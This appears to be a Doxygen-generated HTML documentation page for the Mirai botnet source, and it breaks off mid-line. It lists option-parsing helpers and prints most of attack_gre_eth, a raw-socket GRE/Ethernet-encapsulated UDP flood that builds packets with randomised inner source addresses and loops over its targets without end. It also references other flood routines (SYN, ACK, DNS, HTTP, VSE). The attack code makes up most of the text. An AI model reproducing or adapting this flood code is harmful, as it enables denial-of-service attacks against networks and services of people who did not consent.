<div class="ttc" id="structattack__http__state_html_a9ecd82038dfaf8c3677052cd20b45b16"><div class="ttname"><a href="structattack__http__state.html#a9ecd82038dfaf8c3677052cd20b45b16">attack_http_state::chunked</a></div><div class="ttdeci">int chunked</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00124">attack.h:124</a></div></div>
<div class="ttc" id="attack_8h_html_ab4c96458d5b368729fc078a755d9b70d"><div class="ttname"><a href="attack_8h.html#ab4c96458d5b368729fc078a755d9b70d">ATK_OPT_CONNS</a></div><div class="ttdeci">#define ATK_OPT_CONNS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00070">attack.h:70</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="adcc43340092d63d4b7144999251abb07"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_app_proxy </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__app_8c_source.html#l00020">20</a> of file <a class="el" href="attack__app_8c_source.html">attack_app.c</a>.</p>
<div class="fragment"><div class="line"><a name="l00021"></a><span class="lineno">   21</span>&#160;{</div><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;</div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;}</div></div><!-- fragment -->
</div>
</div>
<a class="anchor" id="aad968465446f65102936f40cdafb4c53"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int attack_get_opt_int </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00206">206</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8c_source.html#l00193">attack_get_opt_str()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00087">util_atoi()</a>, and <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>
<div class="fragment"><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;{</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;    <span class="keywordtype">char</span> *val = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, opt, NULL);</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;    <span class="keywordflow">if</span> (val == NULL)</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;        <span class="keywordflow">return</span> def;</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;        <span class="keywordflow">return</span> <a class="code" href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a>(val, 10);</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;}</div><div class="ttc" id="mirai_2bot_2util_8c_html_a45cd12b38d32ad249e74803c96a12cd3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a></div><div class="ttdeci">int util_atoi(char *str, int base)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00087">util.c:87</a></div></div>
<div class="ttc" id="attack_8c_html_a79b03d7c093d14a1640b2e5bcf2c3c38"><div class="ttname"><a href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a></div><div class="ttdeci">char * attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00193">attack.c:193</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a3baf28bba3efc90dbba2c6bad5a6a51d"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">uint32_t attack_get_opt_ip </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint32_t&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00216">216</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8c_source.html#l00193">attack_get_opt_str()</a>, and <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>
<div class="fragment"><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;{</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;    <span class="keywordtype">char</span> *val = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, opt, NULL);</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;    <span class="keywordflow">if</span> (val == NULL)</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;        <span class="keywordflow">return</span> def;</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;        <span class="keywordflow">return</span> inet_addr(val);</div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;}</div><div class="ttc" id="attack_8c_html_a79b03d7c093d14a1640b2e5bcf2c3c38"><div class="ttname"><a href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a></div><div class="ttdeci">char * attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00193">attack.c:193</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="ad389b7d3f1e1c0dff3b8d01afa578621"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">char* attack_get_opt_str </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00193">193</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00028">attack_option::key</a>, and <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="attack_8c_source.html#l00216">attack_get_opt_ip()</a>, and <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>.</p>
<div class="fragment"><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;{</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; opts_len; i++)</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;    {</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;        <span class="keywordflow">if</span> (opts[i].key == opt)</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;            <span class="keywordflow">return</span> opts[i].val;</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;    }</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;    <span class="keywordflow">return</span> def;</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;}</div></div><!-- fragment -->
</div>
</div>
<a class="anchor" id="acffffc5cd4b1d6c59581a487a63edc07"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_gre_eth </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__gre_8c_source.html#l00162">162</a> of file <a class="el" href="attack__gre_8c_source.html">attack_gre.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00065">ATK_OPT_GRE_CONSTIP</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00047">ATK_OPT_PAYLOAD_RAND</a>, <a class="el" href="attack_8h_source.html#l00046">ATK_OPT_PAYLOAD_SIZE</a>, <a class="el" href="attack_8h_source.html#l00071">ATK_OPT_SOURCE</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="protocol_8h_source.html#l00483">data_len</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="protocol_8h_source.html#l00034">PROTO_GRE_TRANS_ETH</a>, <a class="el" href="protocol_8h_source.html#l00022">grehdr::protocol</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="rand_8c_source.html#l00032">rand_str()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>, and <a class="el" href="mirai_2bot_2util_8c_source.html#l00072">util_memcpy()</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;{</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;    <span class="keywordtype">int</span> <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 512);</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> gcip = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a47ac28075825da3fec16777b2395f331">ATK_OPT_GRE_CONSTIP</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;    uint32_t source_ip = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>, <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>);</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;    {</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;    }</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;    i = 1;</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;    {</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;    }</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;</div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;    {</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;        <span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *greh;</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;        <span class="keyword">struct </span>ethhdr *ethh;</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;        <span class="keyword">struct </span>iphdr *greiph;</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;        <span class="keyword">struct </span>udphdr *udph;</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;        uint32_t ent1, ent2, ent3;</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;        pkts[i] = calloc(1510, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)(pkts[i]);</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;        greh = (<span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *)(iph + 1);</div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;        ethh = (<span class="keyword">struct </span>ethhdr *)(greh + 1);</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;        greiph = (<span class="keyword">struct </span>iphdr *)(ethh + 1);</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;        udph = (<span class="keyword">struct </span>udphdr *)(greiph + 1);</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;        <span class="comment">// IP header init</span></div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structgrehdr.html">grehdr</a>) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> ethhdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;        iph-&gt;protocol = IPPROTO_GRE;</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;        iph-&gt;saddr = source_ip;</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;        iph-&gt;daddr = targs[i].addr;</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;        <span class="comment">// GRE header init</span></div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;        greh-&gt;<a class="code" href="structgrehdr.html#a97d844ebd5716285f25c57931bc67423">protocol</a> = htons(<a class="code" href="protocol_8h.html#a2eab7a2ef2f26d9b33693927a6295780">PROTO_GRE_TRANS_ETH</a>); <span class="comment">// Protocol is 2 bytes</span></div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;        <span class="comment">// Ethernet header init</span></div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;        ethh-&gt;h_proto = htons(ETH_P_IP);</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;</div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;        <span class="comment">// Encapsulated IP header init</span></div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;        greiph-&gt;version = 4;</div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;        greiph-&gt;ihl = 5;</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;        greiph-&gt;tos = ip_tos;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;        greiph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;        greiph-&gt;id = htons(~ip_ident);</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;        greiph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;            greiph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;        greiph-&gt;protocol = IPPROTO_UDP;</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;        greiph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;        <span class="keywordflow">if</span> (gcip)</div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;            greiph-&gt;daddr = iph-&gt;daddr;</div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;            greiph-&gt;daddr = ~(greiph-&gt;saddr - 1024);</div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;</div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;        <span class="comment">// UDP header init</span></div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;        udph-&gt;source = htons(sport);</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;        udph-&gt;dest = htons(dport);</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;        udph-&gt;len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;    }</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;</div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;    {</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;        {</div><div class="line"><a name="l00255"></a><span class="lineno">  255</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;            <span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *greh = (<span class="keyword">struct </span><a class="code" href="structgrehdr.html">grehdr</a> *)(iph + 1);</div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;            <span class="keyword">struct </span>ethhdr *ethh = (<span class="keyword">struct </span>ethhdr *)(greh + 1);</div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;            <span class="keyword">struct </span>iphdr *greiph = (<span class="keyword">struct </span>iphdr *)(ethh + 1);</div><div class="line"><a 